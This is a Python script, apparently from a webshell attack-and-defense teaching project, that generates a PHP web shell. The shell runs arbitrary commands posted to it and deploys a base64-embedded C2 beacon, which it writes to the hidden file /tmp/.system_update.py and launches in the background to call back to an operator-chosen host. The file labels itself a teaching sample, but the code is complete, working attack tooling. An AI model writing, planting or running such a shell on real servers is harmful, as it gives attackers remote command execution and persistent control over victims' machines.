#!/usr/bin/env python3
# 生成 webshell.php：将修复后的 beacon.py 以 base64 形式内嵌，
# 部署时由 PHP 的 base64_decode 还原，彻底避免 heredoc 解析 \n / \\ / $ 等转义破坏 Python 语法。
# C2 地址/端口用 {C2_HOST}/{C2_PORT} 占位符，部署时由表单替换。
import io
import base64
import py_compile
import tempfile
import os

SRC_BEACON = r'F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\webshell\beacon.py'
OUT_PHP = r'F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\webshell\webshell.php'

php_head = r'''<?php
/*
 * WebShell 后门演示样本 (安全教学用途, 严禁未授权使用)
 * 该样本集成: 命令执行面板 + C2 Beacon 部署
 */
header('Content-Type: text/html; charset=utf-8');

function exec_cmd($cmd) {
    $output = shell_exec($cmd . ' 2>&1');
    return $output !== null ? $output : '(no output)';
}

$c2_host = isset($_POST['c2_host']) ? $_POST['c2_host'] : (isset($_GET['c2_host']) ? $_GET['c2_host'] : '192.168.163.1');
$c2_port = isset($_POST['c2_port']) ? intval($_POST['c2_port']) : (isset($_GET['c2_port']) ? intval($_GET['c2_port']) : 8888);

$cmd_result = '';
if (isset($_POST['cmd']) && trim($_POST['cmd']) !== '') {
    $cmd_result = exec_cmd($_POST['cmd']);
}

$deploy_msg = '';
if (isset($_POST['deploy'])) {
    $deploy_msg = deploy_beacon($c2_host, $c2_port);
}

function deploy_beacon($c2_host = '192.168.163.1', $c2_port = 8888) {
    // Beacon 源码以 base64 形式内嵌, 部署时解码, 避免 heredoc 转义破坏 Python 语法
    $beacon_b64 = 'BASE64_PLACEHOLDER';

    $beacon_code = base64_decode($beacon_b64);
    $beacon_code = str_replace('{C2_HOST}', $c2_host, $beacon_code);
    $beacon_code = str_replace('{C2_PORT}', $c2_port, $beacon_code);

    $path = '/tmp/.system_update.py';

    // 写入 Beacon 文件（带错误检查）
    $written = @file_put_contents($path, $beacon_code);
    if ($written === false) {
        return "[!] 部署失败: 无法写入 {$path} (检查 /tmp 目录权限或磁盘空间)";
    }
    if (!@chmod($path, 0755)) {
        return "[!] 部署警告: 无法设置 {$path} 可执行权限 (chmod 0755 失败)";
    }

    // 后台拉起 Beacon
    $pid = trim(shell_exec("nohup python3 " . escapeshellarg($path) . " > /dev/null 2>&1 & echo $!"));
    if ($pid === '') {
        return "[!] 部署失败: 无法启动 python3 (确认 python3 在 apache 用户的 PATH 中, 或改用绝对路径)";
    }

    // 等待 1 秒后确认进程是否还在（若 python 启动即崩, 进程会消失）
    sleep(1);
    $check = shell_exec("ps -p " . escapeshellarg($pid) . " -o pid= 2>/dev/null");
    if (trim($check) === '') {
        // 进程已退出, 读取 python 报错
        $err = shell_exec("python3 " . escapeshellarg($path) . " 2>&1 | head -5");
        return "[!] 部署失败: Beacon 进程 (PID: {$pid}) 启动后立即退出。Python 报错:\n" . $err;
    }

    return "Beacon 已部署 (PID: " . $pid . ")  连接目标: " . $c2_host . ":" . $c2_port;
}
?>
'''

php_tail = r'''<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>演示用 WebShell 控制台</title>
<style>
  body { background:#1e1e1e; color:#d4d4d4; font-family:Consolas,Menlo,monospace; margin:0; padding:20px; }
  h1 { color:#4ec9b0; font-size:18px; }
  .panel { background:#252526; border:1px solid #3c3c3c; border-radius:6px; padding:16px; margin-bottom:16px; }
  .panel h2 { color:#9cdcfe; font-size:14px; margin-top:0; }
  textarea, input[type=text] { background:#1e1e1e; color:#d4d4d4; border:1px solid #3c3c3c; border-radius:4px; padding:8px; font-family:inherit; width:100%; box-sizing:border-box; }
  input[type=text] { width:200px; }
  button { background:#0e639c; color:#fff; border:none; border-radius:4px; padding:8px 16px; cursor:pointer; font-family:inherit; }
  button:hover { background:#1177bb; }
  .row { margin-bottom:10px; }
  label { display:inline-block; width:90px; color:#9cdcfe; }
  pre { background:#1e1e1e; border:1px solid #3c3c3c; border-radius:4px; padding:10px; white-space:pre-wrap; word-break:break-all; max-height:300px; overflow:auto; }
  .ok { color:#6a9955; }
</style>
</head>
<body>
<h1>演示用 WebShell 控制台 (教学环境)</h1>

<div class="panel">
  <h2>命令执行</h2>
  <form method="post">
    <div class="row">
      <input type="text" name="cmd" placeholder="例如: id / whoami / uname -a" style="width:60%">
      <button type="submit">执行</button>
    </div>
  </form>
  <?php if ($cmd_result !== ''): ?>
  <pre><?php echo htmlspecialchars($cmd_result); ?></pre>
  <?php endif; ?>
</div>

<div class="panel">
  <h2>C2 Beacon 部署</h2>
  <form method="post">
    <div class="row">
      <label>C2 地址</label>
      <input type="text" name="c2_host" value="<?php echo htmlspecialchars($c2_host); ?>">
    </div>
    <div class="row">
      <label>C2 端口</label>
      <input type="text" name="c2_port" value="<?php echo htmlspecialchars($c2_port); ?>">
    </div>
    <div class="row">
      <button type="submit" name="deploy" value="1">部署 Beacon</button>
    </div>
  </form>
  <?php if ($deploy_msg !== ''): ?>
  <pre class="ok"><?php echo htmlspecialchars($deploy_msg); ?></pre>
  <?php endif; ?>
</div>

</body>
</html>
'''

with io.open(SRC_BEACON, 'r', encoding='utf-8') as f:
    beacon = f.read()

# 将默认值替换为占位符，部署时由表单值填充
beacon = beacon.replace("C2_HOST = '192.168.163.1'", "C2_HOST = '{C2_HOST}'")
beacon = beacon.replace("C2_PORT = 8888", "C2_PORT = {C2_PORT}")

# base64 编码（utf-8 -> base64）。base64 仅含 [A-Za-z0-9+/=]，无任何会被 PHP 转义的字符。
beacon_b64 = base64.b64encode(beacon.encode('utf-8')).decode('ascii')

# 自检：解码后能否通过 Python 语法编译（模拟 PHP base64_decode 的结果）
decoded = base64.b64decode(beacon_b64).decode('utf-8')
with tempfile.NamedTemporaryFile('w', suffix='.py', delete=False, encoding='utf-8') as tf:
    tf.write(decoded)
    tmp_py = tf.name
try:
    py_compile.compile(tmp_py, doraise=True)
    print("[OK] 内嵌 Beacon 源码语法自检通过 (base64 解码后仍可编译)")
except py_compile.PyCompileError as e:
    os.unlink(tmp_py)
    raise SystemExit("[ERROR] 内嵌 Beacon 源码存在语法错误, 终止生成:\n" + str(e))
os.unlink(tmp_py)

content = php_head.replace('BASE64_PLACEHOLDER', beacon_b64) + php_tail
with io.open(OUT_PHP, 'w', encoding='utf-8', newline='\n') as f:
    f.write(content)

print("written:", OUT_PHP)
print("size:", len(content))
print("beacon_b64 length:", len(beacon_b64))
